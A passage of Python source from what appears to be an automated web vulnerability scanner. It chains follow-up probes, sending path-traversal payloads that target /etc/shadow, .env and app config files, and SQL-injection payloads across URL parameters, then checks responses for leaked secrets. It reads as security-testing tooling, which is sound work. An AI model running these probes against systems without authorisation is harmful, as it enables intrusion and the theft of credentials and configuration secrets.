            ("../../../etc/shadow",           "CRITICAL", "Linux shadow file"),
            ("../../../../etc/hosts",         "MEDIUM",   "Hosts file"),
            ("../config.php",                 "CRITICAL", "PHP config"),
            ("../.env",                       "CRITICAL", "Environment file"),
            ("../../../proc/self/environ",    "HIGH",     "Process environment"),
            ("../web.config",                 "CRITICAL", "IIS web config"),
            ("../appsettings.json",           "CRITICAL", ".NET app settings"),
            ("../application.properties",     "HIGH",     "Java app properties"),
        ]

        findings = []
        print(f"  [Chain] file_api → testing {len(TRAVERSAL_PAYLOADS)} traversal payloads")

        # Detect the parameter name from the URL
        param = "path"
        if "?" in trigger_url:
            for part in trigger_url.split("?")[1].split("&"):
                if "=" in part:
                    param = part.split("=")[0]
                    break

        for payload, sev, reason in TRAVERSAL_PAYLOADS:
            import urllib.parse
            test_url = f"{base}?{param}={urllib.parse.quote(payload)}"

            if test_url in self.probed_urls:
                continue
            self.probed_urls.add(test_url)

            try:
                resp = self._http_get(test_url)
                if not resp:
                    continue
                status  = resp.get("status", 0) if isinstance(resp, dict) else getattr(resp, "status_code", 0)
                text    = resp.get("text", "")  if isinstance(resp, dict) else getattr(resp, "text", "")

                if status not in (200, 206):
                    continue

                # Confirm traversal worked — look for file content signals
                traversal_signals = [
                    "root:x:", "root:*:", "/bin/bash", "/bin/sh",  # passwd
                    "[extensions]", "[fonts]",                      # win.ini
                    "APP_KEY=", "DB_PASSWORD=", "DATABASE_URL",    # .env
                    "<?php", "password", "username", "database",    # config
                    "connectionString", "appSettings",              # .NET
                ]
                confirmed = any(sig in text for sig in traversal_signals)
                if confirmed:
                    findings.append({
                        "url":         test_url,
                        "severity":    "CRITICAL",
                        "vuln_type":   f"Directory traversal confirmed: {payload}",
                        "status":      status,
                        "confirmed":   True,
                        "source":      "orchestrated",
                        "trigger":     "file_api",
                        "trigger_url": trigger_url,
                        "chain_depth": depth,
                        "reason":      reason,
                        "summary":     f"File traversal via {param} parameter — accessed {payload}",
                        "evidence":    {"payload": payload, "param": param,
                                        "content_preview": text[:200]},
                        "category":    "Attack Chain — Path Traversal",
                    })
                    print(f"    [CRITICAL] Traversal confirmed: {payload}")

            except Exception:
                continue

        return findings

    # ── SQL injection follow-up ────────────────────────────────────────────

    def _probe_sqli_followup(self, finding: dict, depth: int) -> list:
        """
        For SQL error findings, probe the same URL with injection payloads
        to confirm exploitability and find additional injection points.
        """
        if depth > self.max_depth:
            return []

        trigger_url = finding.get("url", "")
        if not trigger_url or "?" not in trigger_url:
            return []

        findings = []
        base_url, query = trigger_url.split("?", 1)
        params = query.split("&")

        print(f"  [Chain] sql_error → probing {len(params)} params × {len(SQLI_FOLLOWUP_PAYLOADS)} payloads")

        for param in params[:3]:  # test first 3 params only
            param_name = param.split("=")[0]
            for payload, description in SQLI_FOLLOWUP_PAYLOADS:
                test_url = f"{base_url}?{param_name}={requests.utils.quote(payload)}"

                if test_url in self.probed_urls:
                    continue
                self.probed_urls.add(test_url)

                try:
                    resp = self._http_get(test_url)
                    if not resp:
                        continue

                    status = resp.get("status", 0) if isinstance(resp, dict) else getattr(resp, 'status_code', 0)
                    content = resp.get("text", "") if isinstance(resp, dict) else getattr(resp, 'text', "")

                    # Check for SQL error in response
                    sql_errors = [
                        "sql syntax", "mysql_fetch", "ora-", "pg_query",
                        "sqlite_", "unclosed quotation", "syntax error",
                        "warning: mysql", "invalid query", "division by zero"
                    ]
                    has_error = any(e in content.lower() for e in sql_errors)

                    # Check for time-based (SLEEP payload)
                    # Note: simplified — real time-based needs timing measurement

                    if has_error and status == 200:
                        findings.append({
                            "url":         test_url,
                            "severity":    "CRITICAL",
                            "vuln_type":   f"SQL Injection confirmed — parameter: {param_name}",
                            "status":      status,
                            "confirmed":   True,
                            "source":      "orchestrated",
                            "trigger":     "sql_error",
                            "trigger_url": trigger_url,
                            "chain_depth": depth,
                            "reason":      description,
                            "summary":     f"SQL error in response confirms injection via {param_name}",
                            "evidence":    {"payload": payload, "param": param_name},
                            "category":    "Attack Chain — SQLi",
                        })
                        print(f"    [CRITICAL] SQLi confirmed: {param_name} via '{payload}'")
                        break  # one confirmed per param is enough

                except Exception:
                    continue

        return findings

    # ── HTTP helper ────────────────────────────────────────────────────────

    def _default_http_get(self, url: str) -> dict | None:
        """
        Fallback HTTP getter when http_get_fn not provided.
        Returns dict with {status, text, headers} or None.
        """
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (compatible; MCATester/4.0)",
                "Accept": "text/html,application/xhtml+xml,application/json,*/*",
            }
            r = requests.get(
                url,
                headers    = headers,
                timeout    = self.timeout,
                verify     = False,
                allow_redirects = True,
            )
            return {
                "status":  r.status_code,
                "text":    r.text[:5000],  # cap at 5KB for speed
                "headers": dict(r.headers),
            }
        except Exception:
            return None


# ─────────────────────────────────────────────
# STANDALONE TEST
# Run: python orchestrator.py
# ─────────────────────────────────────────────

if __name__ == "__main__":
    print("=== Orchestrator standalone test ===\n")

    # Simulate findings from a scan
    mock_findings = [
        {
            "url":       "http://demo.testfire.net/swagger/index.html",
            "severity":  "HIGH",
            "vuln_type": "Swagger/OpenAPI UI publicly accessible",
            "confirmed": True,
            "summary":   "Swagger UI found",
            "evidence":  {},
        },
        {
            "url":       "https://demo.testfire.net/admin/",
            "severity":  "HIGH",
            "vuln_type": "Admin panel accessible",
            "confirmed": True,
            "summary":   "Admin panel found",
            "evidence":  {},
        },
    ]

    orc = Orchestrator(
        target       = "demo.testfire.net",
        open_ports   = [80, 443, 8080],
        technologies = ["Apache", "Tomcat"],
        max_depth    = 2,
    )

    new_findings = orc.run(mock_findings)

    print(f"\n{'='*55}")
    print(f"  NEW FINDINGS FROM CHAINS: {len(new_findings)}")
    print(f"{'='*55}")
    for f in new_findings:
        depth = f.get('chain_depth', 0)
        indent = "  " * depth
        print(f"  {indent}[{f['severity']}] {f['vuln_type']}")
        print(f"  {indent}    URL: {f['url']}")
        print(f"  {indent}    Trigger: {f['trigger']} (depth {depth})")
        if f.get("evidence", {}).get("secrets_found"):
            print(f"  {indent}    ⚠ SECRETS: {f['evidence']['secrets_found']}")